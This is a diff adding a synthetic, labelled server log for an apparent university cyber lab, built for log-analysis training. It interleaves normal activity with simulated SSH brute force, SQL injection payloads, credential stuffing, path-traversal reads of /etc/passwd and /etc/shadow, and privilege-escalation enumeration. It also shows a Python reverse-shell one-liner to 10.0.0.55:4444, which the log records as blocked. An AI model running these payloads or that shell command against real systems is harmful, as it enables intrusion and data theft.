@@ -1,0 +1,397 @@
+# =============================================================================
+# USNA SY402 - MCP Cyber Lab - Synthetic Server Log File
+# Host: usna-webserver-01.cyber.local | OS: Ubuntu 24.04 LTS
+# Log Period: 2026-03-10 00:00:00 - 2026-03-10 23:59:59
+# Log Sources: syslog, sshd, Apache2, auditd, ufw, cron, auth.log
+# NOTE: This file contains SIMULATED events for educational purposes only.
+# =============================================================================
+
+# ---------------------------------------------------------------------------
+# SECTION 1: SYSTEM BOOT AND INITIALIZATION (00:00 - 08:05)
+# ---------------------------------------------------------------------------
+
+2026-03-10 00:00:01 - kernel: [    0.000000] Linux version 6.8.0-31-generic (Ubuntu 24.04 LTS)
+2026-03-10 00:00:01 - kernel: [    0.000000] BIOS-provided physical RAM map verified.
+2026-03-10 00:00:02 - systemd[1]: Starting System Initialization...
+2026-03-10 00:00:03 - systemd[1]: Started Journal Service.
+2026-03-10 00:00:04 - systemd[1]: Starting Network Time Synchronization...
+2026-03-10 00:00:05 - systemd-timesyncd[312]: Synchronized to time server 192.168.1.1:123 (ntp.local).
+2026-03-10 00:00:06 - systemd[1]: Starting OpenSSH server daemon...
+2026-03-10 00:00:07 - sshd[1042]: Server listening on 0.0.0.0 port 22.
+2026-03-10 00:00:07 - sshd[1042]: Server listening on :: port 22.
+2026-03-10 00:00:08 - systemd[1]: Starting Apache HTTP Server...
+2026-03-10 00:00:09 - apache2[1105]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.0.1.
+2026-03-10 00:00:09 - apache2[1105]: AH00094: Command line: '/usr/sbin/apache2 -D FOREGROUND'
+2026-03-10 00:00:10 - systemd[1]: Started Apache HTTP Server.
+2026-03-10 00:00:11 - systemd[1]: Starting MySQL Community Server...
+2026-03-10 00:00:13 - mysqld[1210]: mysqld: ready for connections. Version: '8.0.36' socket: '/var/run/mysqld/mysqld.sock' port: 3306
+2026-03-10 00:00:14 - systemd[1]: Started MySQL Community Server.
+2026-03-10 00:00:15 - systemd[1]: Starting Uncomplicated Firewall...
+2026-03-10 00:00:15 - ufw[1250]: Firewall active. Default policy: DENY incoming, ALLOW outgoing.
+2026-03-10 00:00:16 - ufw[1250]: Rule: ALLOW IN 22/tcp from 192.168.1.0/24
+2026-03-10 00:00:16 - ufw[1250]: Rule: ALLOW IN 80/tcp from any
+2026-03-10 00:00:16 - ufw[1250]: Rule: ALLOW IN 443/tcp from any
+2026-03-10 00:00:17 - systemd[1]: Reached target Multi-User System.
+2026-03-10 00:00:17 - systemd[1]: Startup finished in 17.243s (kernel) + 4.512s (userspace).
+2026-03-10 00:01:01 - CRON[1301]: (root) CMD (/usr/lib/logrotate/logrotate /etc/logrotate.conf)
+2026-03-10 00:01:02 - logrotate[1302]: rotating log file /var/log/apache2/access.log, new file created.
+2026-03-10 00:05:01 - CRON[1350]: (root) CMD (/usr/bin/rkhunter --cronjob --update --quiet)
+2026-03-10 00:05:11 - rkhunter[1351]: [ RKHunter 1.4.6 ] - No rootkit indicators found. System clean.
+
+# ---------------------------------------------------------------------------
+# SECTION 2: OVERNIGHT NORMAL OPERATIONS (00:10 - 07:55)
+# ---------------------------------------------------------------------------
+
+2026-03-10 00:15:00 - apache2[1105]: 192.168.1.10 - - "GET /index.html HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (compatible; Googlebot/2.1)"
+2026-03-10 00:22:31 - apache2[1105]: 192.168.1.10 - - "GET /robots.txt HTTP/1.1" 200 124
+2026-03-10 01:00:01 - CRON[1401]: (www-data) CMD (/usr/bin/php /var/www/html/cron/cleanup.php)
+2026-03-10 01:00:03 - auditd[1500]: type=SYSCALL msg=audit(1741564803): auid=1001 uid=33 gid=33 exe="/usr/bin/php" key="cron_exec"
+2026-03-10 02:00:01 - CRON[1450]: (root) CMD (/usr/sbin/ntpdate -s ntp.local)
+2026-03-10 02:00:02 - ntpdate[1451]: adjust time server 192.168.1.1 offset -0.000123 sec
+2026-03-10 03:00:01 - CRON[1500]: (root) CMD (/usr/bin/rsync -az /var/www/html /mnt/backup/html)
+2026-03-10 03:00:45 - rsync[1501]: sent 14,235,012 bytes received 324 bytes 9,490,224 bytes/sec
+2026-03-10 04:30:00 - apache2[1105]: 10.10.10.5 - - "GET /health HTTP/1.1" 200 18 "-" "HealthCheck/2.0"
+2026-03-10 04:30:00 - apache2[1105]: 10.10.10.5 - - "GET /status HTTP/1.1" 200 312 "-" "HealthCheck/2.0"
+2026-03-10 05:00:01 - CRON[1550]: (root) CMD (/usr/bin/find /tmp -mtime +1 -delete)
+2026-03-10 05:00:02 - auditd[1500]: type=PATH msg=audit: name="/tmp/sess_a3f9d21e" nametype=DELETE
+2026-03-10 05:00:02 - auditd[1500]: type=PATH msg=audit: name="/tmp/sess_bb12c44f" nametype=DELETE
+2026-03-10 05:00:02 - auditd[1500]: type=PATH msg=audit: name="/tmp/sess_9e3a1d77" nametype=DELETE
+2026-03-10 06:00:01 - CRON[1600]: (root) CMD (/usr/bin/certbot renew --quiet)
+2026-03-10 06:00:04 - certbot[1601]: Certificate not yet due for renewal.
+2026-03-10 07:00:01 - CRON[1650]: (root) CMD (/usr/sbin/logwatch --mailto root --detail Med)
+2026-03-10 07:00:12 - logwatch[1651]: Summary report generated. 0 critical events overnight.
+
+# ---------------------------------------------------------------------------
+# SECTION 3: MORNING LEGITIMATE USER ACTIVITY (08:00 - 09:10)
+# ---------------------------------------------------------------------------
+
+2026-03-10 08:00:15 - systemd[1]: Starting daily maintenance window...
+2026-03-10 08:00:16 - sshd[1042]: Server listening on 0.0.0.0 port 22. (keepalive refresh)
+2026-03-10 08:05:01 - User: admin - Action: Login Success - IP: 192.168.1.5 - Method: publickey - Session: ssh-sess-001
+2026-03-10 08:05:03 - auditd[1500]: type=USER_LOGIN msg=audit: pid=2001 uid=1000 auid=1000 ses=1 exe="/usr/sbin/sshd" hostname=admin-workstation.local addr=192.168.1.5 terminal=ssh res=success
+2026-03-10 08:05:10 - User: admin - Action: Command - CMD: "sudo systemctl status apache2" - Session: ssh-sess-001
+2026-03-10 08:05:11 - User: admin - Action: Command - CMD: "df -h" - Session: ssh-sess-001
+2026-03-10 08:05:15 - User: admin - Action: Command - CMD: "tail -n 50 /var/log/apache2/error.log" - Session: ssh-sess-001
+2026-03-10 08:06:00 - apache2[1105]: 192.168.1.5 - - "GET /admin/dashboard.php HTTP/1.1" 200 14832 "https://192.168.1.5/login.php" "Mozilla/5.0 (X11; Linux x86_64)"
+2026-03-10 08:06:32 - apache2[1105]: 192.168.1.5 - - "GET /admin/users.php HTTP/1.1" 200 8921
+2026-03-10 08:07:00 - User: admin - Action: File Read - Path: /var/log/apache2/access.log - Status: SUCCESS - Session: ssh-sess-001
+2026-03-10 08:08:10 - User: developer1 - Action: Login Success - IP: 192.168.1.22 - Method: publickey - Session: ssh-sess-002
+2026-03-10 08:08:15 - User: developer1 - Action: Command - CMD: "git pull origin main" - Session: ssh-sess-002
+2026-03-10 08:08:22 - User: developer1 - Action: File Write - Path: /var/www/html/app/config.php - Status: SUCCESS - Session: ssh-sess-002
+2026-03-10 08:09:01 - apache2[1105]: 192.168.1.22 - - "GET /app/index.php HTTP/1.1" 200 5432 "-" "curl/7.88.1"
+2026-03-10 08:09:05 - apache2[1105]: 192.168.1.22 - - "GET /app/api/health HTTP/1.1" 200 42
+2026-03-10 08:10:00 - User: backup_svc - Action: Login Success - IP: 192.168.1.30 - Method: publickey - Session: ssh-sess-003
+2026-03-10 08:10:05 - User: backup_svc - Action: Command - CMD: "/usr/bin/rsync -az /var/www/html 192.168.1.30:/backups/web/" - Session: ssh-sess-003
+2026-03-10 08:10:45 - User: backup_svc - Action: Logout - Session: ssh-sess-003 - Duration: 40s
+2026-03-10 08:15:01 - User: admin - Action: Command - CMD: "sudo apt list --upgradable" - Session: ssh-sess-001
+2026-03-10 08:15:08 - User: admin - Action: Command - CMD: "sudo apt upgrade -y" - Session: ssh-sess-001
+2026-03-10 08:17:42 - systemd[1]: Reloading apache2.service - Reloading Apache HTTP Server.
+2026-03-10 08:20:00 - User: admin - Action: Logout - Session: ssh-sess-001 - Duration: 14m59s
+2026-03-10 08:25:00 - apache2[1105]: 203.0.113.45 - - "GET /index.html HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2026-03-10 08:25:01 - apache2[1105]: 203.0.113.45 - - "GET /about.php HTTP/1.1" 200 3210
+2026-03-10 08:25:03 - apache2[1105]: 203.0.113.45 - - "GET /contact.php HTTP/1.1" 200 2876
+2026-03-10 08:30:00 - apache2[1105]: 198.51.100.88 - - "GET /products.php HTTP/1.1" 200 11240 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+2026-03-10 08:45:00 - mysqld[1210]: Aborted connection 4521 to db: 'webapp' user: 'webapp_ro' host: 'localhost' (Got timeout reading communication packets)
+2026-03-10 08:50:00 - User: developer1 - Action: Logout - Session: ssh-sess-002 - Duration: 41m50s
+
+# ---------------------------------------------------------------------------
+# SECTION 4: SSH BRUTE FORCE ATTACK (09:12 - 09:28)
+# Attacker: 10.0.0.55 (external unknown host)
+# Technique: T1110.001 - Brute Force: Password Guessing (MITRE ATT&CK)
+# ---------------------------------------------------------------------------
+
+2026-03-10 09:12:01 - sshd[2105]: Failed password for invalid user root from 10.0.0.55 port 42312 ssh2
+2026-03-10 09:12:03 - sshd[2107]: Failed password for invalid user root from 10.0.0.55 port 42318 ssh2
+2026-03-10 09:12:05 - sshd[2109]: Failed password for invalid user root from 10.0.0.55 port 42324 ssh2
+2026-03-10 09:12:07 - sshd[2111]: Failed password for invalid user admin from 10.0.0.55 port 42330 ssh2
+2026-03-10 09:12:09 - sshd[2113]: Failed password for invalid user administrator from 10.0.0.55 port 42336 ssh2
+2026-03-10 09:12:11 - sshd[2115]: Failed password for invalid user ubuntu from 10.0.0.55 port 42342 ssh2
+2026-03-10 09:12:13 - sshd[2117]: Failed password for invalid user user from 10.0.0.55 port 42348 ssh2
+2026-03-10 09:12:15 - sshd[2119]: Failed password for invalid user pi from 10.0.0.55 port 42354 ssh2
+2026-03-10 09:12:17 - sshd[2121]: Failed password for invalid user postgres from 10.0.0.55 port 42360 ssh2
+2026-03-10 09:12:19 - sshd[2123]: Failed password for invalid user oracle from 10.0.0.55 port 42366 ssh2
+2026-03-10 09:12:21 - sshd[2125]: Failed password for invalid user deploy from 10.0.0.55 port 42372 ssh2
+2026-03-10 09:12:23 - sshd[2127]: Failed password for invalid user git from 10.0.0.55 port 42378 ssh2
+2026-03-10 09:12:25 - sshd[2129]: Failed password for invalid user test from 10.0.0.55 port 42384 ssh2
+2026-03-10 09:12:27 - sshd[2131]: Failed password for invalid user support from 10.0.0.55 port 42390 ssh2
+2026-03-10 09:12:29 - sshd[2133]: Failed password for invalid user service from 10.0.0.55 port 42396 ssh2
+2026-03-10 09:12:31 - sshd[2135]: Failed password for user developer1 from 10.0.0.55 port 42402 ssh2
+2026-03-10 09:12:33 - sshd[2137]: Failed password for user developer1 from 10.0.0.55 port 42408 ssh2
+2026-03-10 09:12:35 - sshd[2139]: Failed password for user developer1 from 10.0.0.55 port 42414 ssh2
+2026-03-10 09:12:37 - sshd[2141]: Failed password for user backup_svc from 10.0.0.55 port 42420 ssh2
+2026-03-10 09:12:39 - sshd[2143]: Failed password for user backup_svc from 10.0.0.55 port 42426 ssh2
+2026-03-10 09:13:00 - ufw[1250]: BLOCK IN on eth0 from 10.0.0.55 to 0.0.0.0/0 proto tcp - Rate limit triggered after 20 failed auth attempts.
+2026-03-10 09:13:01 - sshd[2150]: PAM 20 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.0.55
+2026-03-10 09:13:01 - sshd[2151]: Disconnecting authenticating user backup_svc 10.0.0.55 port 42426: Too many authentication failures [preauth]
+2026-03-10 09:13:02 - fail2ban[1700]: 10.0.0.55: FOUND ssh - 20 failures in 62 seconds
+2026-03-10 09:13:03 - fail2ban[1700]: 10.0.0.55: Ban 10.0.0.55 for 3600 seconds (ssh jail)
+2026-03-10 09:13:03 - ufw[1250]: Rule added: DENY IN from 10.0.0.55 to any (fail2ban auto-ban)
+# --- ATTACKER PAUSES, RESUMES FROM NEW IP ---
+2026-03-10 09:18:44 - sshd[2200]: Failed password for invalid user webmaster from 10.0.0.56 port 51200 ssh2
+2026-03-10 09:18:46 - sshd[2202]: Failed password for invalid user root from 10.0.0.56 port 51206 ssh2
+2026-03-10 09:18:48 - sshd[2204]: Failed password for invalid user admin from 10.0.0.56 port 51212 ssh2
+2026-03-10 09:19:50 - fail2ban[1700]: 10.0.0.56: Ban 10.0.0.56 for 3600 seconds (ssh jail)
+2026-03-10 09:19:51 - ufw[1250]: Rule added: DENY IN from 10.0.0.56 to any (fail2ban auto-ban)
+
+# ---------------------------------------------------------------------------
+# SECTION 5: NORMAL MID-MORNING TRAFFIC (09:30 - 10:40)
+# ---------------------------------------------------------------------------
+
+2026-03-10 09:30:00 - apache2[1105]: 203.0.113.22 - - "GET /index.html HTTP/1.1" 200 4523
+2026-03-10 09:31:10 - apache2[1105]: 198.51.100.17 - - "POST /contact.php HTTP/1.1" 200 2102
+2026-03-10 09:33:00 - apache2[1105]: 203.0.113.55 - - "GET /login.php HTTP/1.1" 200 3210
+2026-03-10 09:33:22 - apache2[1105]: 203.0.113.55 - - "POST /login.php HTTP/1.1" 302 0 - Redirect to /dashboard.php
+2026-03-10 09:33:23 - apache2[1105]: 203.0.113.55 - - "GET /dashboard.php HTTP/1.1" 200 9812
+2026-03-10 09:40:00 - mysqld[1210]: Query_time: 0.0021 Lock_time: 0.0000 Rows_examined: 142 SELECT * FROM products WHERE category='electronics'
+2026-03-10 09:45:00 - User: developer1 - Action: Login Success - IP: 192.168.1.22 - Method: publickey - Session: ssh-sess-004
+2026-03-10 09:45:10 - User: developer1 - Action: Command - CMD: "tail -f /var/log/apache2/error.log" - Session: ssh-sess-004
+2026-03-10 09:55:00 - apache2[1105]: 192.168.1.22 - - "GET /app/api/v2/test HTTP/1.1" 200 88
+2026-03-10 10:00:01 - CRON[2300]: (www-data) CMD (/usr/bin/php /var/www/html/cron/send_reports.php)
+2026-03-10 10:00:09 - sendmail[2301]: 2026-03-10T10:00:09: Message submitted. To: admin@cyber.local, Subject: Daily Report
+2026-03-10 10:10:00 - apache2[1105]: 203.0.113.80 - - "GET /products.php?id=4 HTTP/1.1" 200 7654
+2026-03-10 10:15:00 - apache2[1105]: 198.51.100.34 - - "GET /search.php?q=laptop HTTP/1.1" 200 6210
+2026-03-10 10:20:00 - apache2[1105]: 203.0.113.44 - - "GET /download.php?file=brochure.pdf HTTP/1.1" 200 184320
+2026-03-10 10:30:00 - mysqld[1210]: [Note] Aborted connection 4599 to db: 'webapp' user: 'webapp_rw' host: 'localhost'
+2026-03-10 10:35:00 - apache2[1105]: 203.0.113.99 - - "GET /page-not-found-xyz.php HTTP/1.1" 404 512
+2026-03-10 10:38:00 - apache2[1105]: 203.0.113.14 - - "GET /login.php HTTP/1.1" 200 3210
+
+# ---------------------------------------------------------------------------
+# SECTION 6: WEB APPLICATION ATTACK - SQL INJECTION (10:45 - 11:05)
+# Attacker: 172.16.0.40
+# Technique: T1190 - Exploit Public-Facing Application (MITRE ATT&CK)
+#            CWE-89 - Improper Neutralization of Special Elements in SQL Query
+# ---------------------------------------------------------------------------
+
+2026-03-10 10:45:00 - apache2[1105]: 172.16.0.40 - - "GET /login.php HTTP/1.1" 200 3210 "-" "Mozilla/5.0 (compatible)"
+# --- RECONNAISSANCE: Checking server headers ---
+2026-03-10 10:45:10 - apache2[1105]: 172.16.0.40 - - "HEAD /login.php HTTP/1.1" 200 0
+2026-03-10 10:45:12 - apache2[1105]: 172.16.0.40 - - "OPTIONS / HTTP/1.1" 200 0
+# --- INITIAL INJECTION PROBES ---
+2026-03-10 10:45:18 - apache2[1105]: 172.16.0.40 - - "GET /login.php?user=' HTTP/1.1" 500 512 - MySQL error exposed
+2026-03-10 10:45:20 - apache2[1105]: 172.16.0.40 - - "GET /login.php?user='' HTTP/1.1" 200 3210
+2026-03-10 10:45:22 - apache2[1105]: 172.16.0.40 - - "GET /login.php?user=' OR 1=1 -- HTTP/1.1" 200 9812 - AUTHENTICATION BYPASS
+2026-03-10 10:45:22 - mysqld[1210]: [Warning] Unsafe statement logged in binary log: SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password=''
+2026-03-10 10:45:30 - apache2[1105]: 172.16.0.40 - - "GET /login.php?user=' OR '1'='1 HTTP/1.1" 200 9812
+2026-03-10 10:45:35 - apache2[1105]: 172.16.0.40 - - "GET /login.php?user=admin'-- HTTP/1.1" 200 9812 - Logged in as admin
+# --- POST-AUTH ENUMERATION ---
+2026-03-10 10:46:00 - apache2[1105]: 172.16.0.40 - - "GET /admin/config.php HTTP/1.1" 403 512
+2026-03-10 10:46:10 - apache2[1105]: 172.16.0.40 - - "GET /admin/config.php HTTP/1.1" 403 512
+2026-03-10 10:46:20 - apache2[1105]: 172.16.0.40 - - "GET /admin/ HTTP/1.1" 403 512
+2026-03-10 10:46:30 - apache2[1105]: 172.16.0.40 - - "GET /phpmyadmin/ HTTP/1.1" 404 512
+2026-03-10 10:46:40 - apache2[1105]: 172.16.0.40 - - "GET /pma/ HTTP/1.1" 404 512
+2026-03-10 10:46:50 - apache2[1105]: 172.16.0.40 - - "GET /.env HTTP/1.1" 403 512
+2026-03-10 10:47:00 - apache2[1105]: 172.16.0.40 - - "GET /wp-admin/ HTTP/1.1" 404 512
+2026-03-10 10:47:10 - apache2[1105]: 172.16.0.40 - - "GET /wp-login.php HTTP/1.1" 404 512
+# --- UNION-BASED SQL INJECTION ATTEMPT ---
+2026-03-10 10:48:00 - apache2[1105]: 172.16.0.40 - - "GET /products.php?id=1 UNION SELECT 1,2,3,4 -- HTTP/1.1" 200 7654
+2026-03-10 10:48:05 - apache2[1105]: 172.16.0.40 - - "GET /products.php?id=1 UNION SELECT table_name,2,3,4 FROM information_schema.tables -- HTTP/1.1" 200 8901
+2026-03-10 10:48:10 - mysqld[1210]: [Warning] Unsafe UNION SELECT detected. Query: SELECT id,name,desc,price FROM products WHERE id='1 UNION SELECT table_name,2,3,4 FROM information_schema.tables -- '
+2026-03-10 10:48:15 - apache2[1105]: 172.16.0.40 - - "GET /products.php?id=1 UNION SELECT username,password,3,4 FROM users -- HTTP/1.1" 200 8432 - USER DATA LIKELY EXPOSED
+2026-03-10 10:48:30 - auditd[1500]: type=KERN msg=audit: Suspicious SQL pattern detected by mod_security - rule 942100 triggered - client: 172.16.0.40
+2026-03-10 10:49:00 - modsecurity[1800]: [id 942100] [msg "SQL Injection Attack Detected"] [data "OR 1=1"] [severity CRITICAL] [uri /login.php] [client 172.16.0.40]
+2026-03-10 10:55:00 - ufw[1250]: Rule added: DENY IN from 172.16.0.40 (ModSecurity auto-block after 10 SQL injection attempts)
+2026-03-10 11:00:00 - apache2[1105]: 172.16.0.40 - - "GET /login.php HTTP/1.1" 403 512 - IP BLOCKED
+
+# ---------------------------------------------------------------------------
+# SECTION 7: CREDENTIAL STUFFING ATTEMPT (11:05 - 11:20)
+# Attacker: 172.16.0.41 (different IP, same subnet — possible proxy rotation)
+# Technique: T1110.004 - Brute Force: Credential Stuffing (MITRE ATT&CK)
+# ---------------------------------------------------------------------------
+
+2026-03-10 11:05:00 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=bill.goat@example.com, failed
+2026-03-10 11:05:02 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=army.mule@example.com, failed
+2026-03-10 11:05:04 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=admin@cyber.local, failed
+2026-03-10 11:05:06 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=test@test.com, failed
+2026-03-10 11:05:08 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=info@cyber.local, failed
+2026-03-10 11:05:10 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=support@cyber.local, failed
+2026-03-10 11:05:12 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 302 0 - user=developer1@cyber.local, failed
+2026-03-10 11:05:14 - apache2[1105]: 172.16.0.41 - - "POST /login.php HTTP/1.1" 429 512 - RATE LIMIT TRIGGERED
+2026-03-10 11:05:14 - apache2[1105]: mod_ratelimit: client 172.16.0.41 exceeded 7 POST /login.php requests in 14 seconds. Throttling.
+2026-03-10 11:10:00 - fail2ban[1700]: 172.16.0.41: Ban 172.16.0.41 for 7200 seconds (http-auth jail)
+
+# ---------------------------------------------------------------------------
+# SECTION 8: DATA EXFILTRATION ATTEMPTS (11:30 - 12:15)
+# User: guest (low-privilege account, authenticated)
+# Technique: T1530 - Data from Cloud Storage / T1005 - Data from Local System
+# ---------------------------------------------------------------------------
+
+2026-03-10 11:28:00 - User: guest - Action: Login Success - IP: 10.10.10.99 - Method: password - Session: web-sess-0441
+2026-03-10 11:28:05 - apache2[1105]: 10.10.10.99 - - "GET /dashboard.php HTTP/1.1" 200 4200 (guest permissions)
+2026-03-10 11:29:00 - apache2[1105]: 10.10.10.99 - - "GET /download.php?file=../../../etc/passwd HTTP/1.1" 403 512 - Path traversal blocked by app
+2026-03-10 11:29:30 - apache2[1105]: 10.10.10.99 - - "GET /download.php?file=....//....//etc/passwd HTTP/1.1" 403 512 - Double-encode attempt blocked
+2026-03-10 11:30:00 - User: guest - Action: File Download - Path: /etc/shadow - Status: DENIED - Reason: Insufficient permissions
+2026-03-10 11:30:05 - auditd[1500]: type=AVC msg=audit: denied { read } for pid=2501 comm="php" name="shadow" dev="sda1" ino=131073 scontext=www-data tcontext=shadow_t - PERMISSION DENIED
+2026-03-10 11:30:10 - User: guest - Action: File Download - Path: /etc/passwd - Status: DENIED - Reason: Blocked by WAF rule
+2026-03-10 11:30:45 - apache2[1105]: 10.10.10.99 - - "GET /download.php?file=brochure.pdf HTTP/1.1" 200 184320 - Legitimate file, allowed
+2026-03-10 11:31:00 - User: guest - Action: File Download - Path: /var/www/html/app/config.php - Status: DENIED - Reason: PHP files not serveable as downloads
+2026-03-10 11:31:30 - User: guest - Action: File Download - Path: /var/www/html/app/database.php - Status: DENIED
+2026-03-10 11:32:00 - User: guest - Action: File Download - Path: /proc/version - Status: DENIED
+2026-03-10 11:32:15 - User: guest - Action: File Download - Path: /var/www/html/backup.zip - Status: SUCCESS - Size: 48291840 bytes - WARNING: Backup archive should not be publicly accessible
+2026-03-10 11:32:45 - auditd[1500]: type=SYSCALL msg=audit: auid=5001 uid=33 gid=33 syscall=read path="/var/www/html/backup.zip" - 48291840 bytes read by guest via PHP
+2026-03-10 11:33:00 - User: guest - Action: File Download - Path: /var/www/html/.git/config - Status: SUCCESS - WARNING: .git directory exposed
+2026-03-10 11:33:10 - User: guest - Action: File Download - Path: /var/www/html/.git/COMMIT_EDITMSG - Status: SUCCESS
+2026-03-10 11:33:20 - User: guest - Action: File Download - Path: /var/www/html/.git/logs/HEAD - Status: SUCCESS - Git history exposed to guest
+2026-03-10 11:35:00 - User: guest - Action: Logout - Session: web-sess-0441 - Duration: 7m00s
+2026-03-10 11:36:00 - auditd[1500]: [ALERT] Anomaly detected: guest account downloaded 48MB in single session. Flagged for review.
+
+# ---------------------------------------------------------------------------
+# SECTION 9: PRIVILEGE ESCALATION ATTEMPT (12:00 - 12:20)
+# Technique: T1068 - Exploitation for Privilege Escalation (MITRE ATT&CK)
+#            T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
+# ---------------------------------------------------------------------------
+
+2026-03-10 12:00:00 - User: developer2 - Action: Login Success - IP: 192.168.1.45 - Method: password - Session: ssh-sess-005
+2026-03-10 12:00:10 - User: developer2 - Action: Command - CMD: "id" - Result: "uid=1002(developer2) gid=1002(developer2) groups=1002(developer2)" - Session: ssh-sess-005
+2026-03-10 12:00:15 - User: developer2 - Action: Command - CMD: "sudo -l" - Result: "Sorry, user developer2 may not run sudo on this host." - Session: ssh-sess-005
+2026-03-10 12:00:30 - User: developer2 - Action: Command - CMD: "find / -perm -4000 -type f 2>/dev/null" - Session: ssh-sess-005 - NOTE: SUID binary enumeration
+2026-03-10 12:00:45 - User: developer2 - Action: Command - CMD: "find / -writable -type f 2>/dev/null | grep -v proc" - Session: ssh-sess-005 - NOTE: Writable file search
+2026-03-10 12:01:00 - User: developer2 - Action: Command - CMD: "cat /etc/crontab" - Session: ssh-sess-005
+2026-03-10 12:01:10 - User: developer2 - Action: Command - CMD: "ls -la /etc/cron.d/" - Session: ssh-sess-005
+2026-03-10 12:01:30 - User: developer2 - Action: Command - CMD: "uname -a" - Result: "Linux usna-webserver-01 6.8.0-31-generic #31-Ubuntu SMP" - Session: ssh-sess-005
+2026-03-10 12:02:00 - User: developer2 - Action: Command - CMD: "cat /etc/os-release" - Session: ssh-sess-005
+2026-03-10 12:02:30 - auditd[1500]: type=SYSCALL msg=audit: auid=1002 uid=1002 SUSPICIOUS: Multiple enumeration commands (find -perm -4000, find -writable) from developer2 in <2 minutes
+2026-03-10 12:03:00 - User: developer2 - Action: Command - CMD: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.55\",4444));'" - BLOCKED by AppArmor
+2026-03-10 12:03:01 - apparmor[2600]: DENIED: /usr/bin/python3 connect to 10.0.0.55:4444 (profile: /usr/bin/python3, operation: connect)
+2026-03-10 12:03:02 - auditd[1500]: [CRITICAL] Outbound connection attempt to known malicious IP 10.0.0.55:4444 blocked. User: developer2. Possible reverse shell attempt.
+2026-03-10 12:03:05 - User: developer2 - Action: Logout - Session: ssh-sess-005 - Duration: 3m05s (abnormal early logout)
+2026-03-10 12:05:00 - auditd[1500]: [ALERT] Automated incident response: developer2 account locked pending security review.
+2026-03-10 12:05:01 - User: admin - Action: Login Success - IP: 192.168.1.5 - Method: publickey - Session: ssh-sess-006 (emergency login)
+2026-03-10 12:05:10 - User: admin - Action: Command - CMD: "sudo usermod -L developer2" - Result: SUCCESS - Session: ssh-sess-006
+2026-03-10 12:05:15 - User: admin - Action: Command - CMD: "sudo last developer2" - Session: ssh-sess-006
+2026-03-10 12:05:20 - User: admin - Action: Command - CMD: "sudo grep developer2 /var/log/auth.log" - Session: ssh-sess-006
+
+# ---------------------------------------------------------------------------
+# SECTION 10: AFTERNOON NORMAL OPERATIONS (12:30 - 15:00)
+# ---------------------------------------------------------------------------
+
+2026-03-10 12:30:00 - apache2[1105]: 203.0.113.201 - - "GET /index.html HTTP/1.1" 200 4523
+2026-03-10 12:31:00 - apache2[1105]: 198.51.100.155 - - "GET /products.php HTTP/1.1" 200 11240
+2026-03-10 12:32:00 - apache2[1105]: 203.0.113.77 - - "POST /contact.php HTTP/1.1" 200 2102
+2026-03-10 12:45:00 - mysqld[1210]: [Note] InnoDB: page_cleaner: 1000ms intended loop took 1243ms. The settings might not be optimal.
+2026-03-10 13:00:01 - CRON[2700]: (root) CMD (/usr/bin/find /var/log -name "*.gz" -mtime +30 -delete)
+2026-03-10 13:00:02 - CRON[2700]: Removed 3 old compressed log files.
+2026-03-10 13:00:01 - CRON[2701]: (www-data) CMD (/usr/bin/php /var/www/html/cron/cache_clear.php)
+2026-03-10 13:15:00 - apache2[1105]: 203.0.113.88 - - "GET /search.php?q=networking+hardware HTTP/1.1" 200 7821
+2026-03-10 13:30:00 - User: admin - Action: Command - CMD: "sudo tail -200 /var/log/auth.log" - Session: ssh-sess-006
+2026-03-10 13:30:45 - User: admin - Action: Command - CMD: "sudo fail2ban-client status ssh" - Session: ssh-sess-006
+2026-03-10 13:31:00 - User: admin - Action: Command - CMD: "sudo ufw status verbose" - Session: ssh-sess-006
+2026-03-10 13:45:00 - apache2[1105]: 198.51.100.200 - - "GET /login.php HTTP/1.1" 200 3210
+2026-03-10 13:45:30 - apache2[1105]: 198.51.100.200 - - "POST /login.php HTTP/1.1" 302 0 - Successful login: user=analyst1
+2026-03-10 13:45:31 - apache2[1105]: 198.51.100.200 - - "GET /dashboard.php HTTP/1.1" 200 9812
+2026-03-10 14:00:01 - CRON[2800]: (root) CMD (/usr/sbin/aide --check)
+2026-03-10 14:00:45 - aide[2801]: AIDE integrity check complete. Changed: /var/www/html/app/config.php (developer1 modification at 08:08). No unauthorized changes detected.
+2026-03-10 14:15:00 - apache2[1105]: 203.0.113.15 - - "GET /download.php?file=whitepaper_v2.pdf HTTP/1.1" 200 2097152
+2026-03-10 14:30:00 - mysqld[1210]: Slow query log: Query_time: 3.21 Lock_time: 0.001 Rows_examined: 45231 SELECT * FROM orders WHERE DATE(created_at) = '2026-03-10'
+2026-03-10 14:45:00 - apache2[1105]: 10.10.10.5 - - "GET /health HTTP/1.1" 200 18
+2026-03-10 15:00:01 - CRON[2900]: (root) CMD (/usr/bin/clamscan -r /var/www/html --quiet --infected --log=/var/log/clamav/scan.log)
+2026-03-10 15:00:48 - clamav[2901]: Scan complete. Scanned: 4821 files. Infected: 0. Time: 47.32 secs.
+
+# ---------------------------------------------------------------------------
+# SECTION 11: AUTOMATED SCANNER / RECONNAISSANCE (15:10 - 15:25)
+# Source: 198.51.100.99 (Shodan-like automated scanner)
+# Technique: T1595 - Active Scanning (MITRE ATT&CK)
+# ---------------------------------------------------------------------------
+
+2026-03-10 15:10:00 - apache2[1105]: 198.51.100.99 - - "GET / HTTP/1.1" 200 4523 "-" "Shodan/2.0"
+2026-03-10 15:10:01 - apache2[1105]: 198.51.100.99 - - "GET /robots.txt HTTP/1.1" 200 124
+2026-03-10 15:10:02 - apache2[1105]: 198.51.100.99 - - "GET /sitemap.xml HTTP/1.1" 404 512
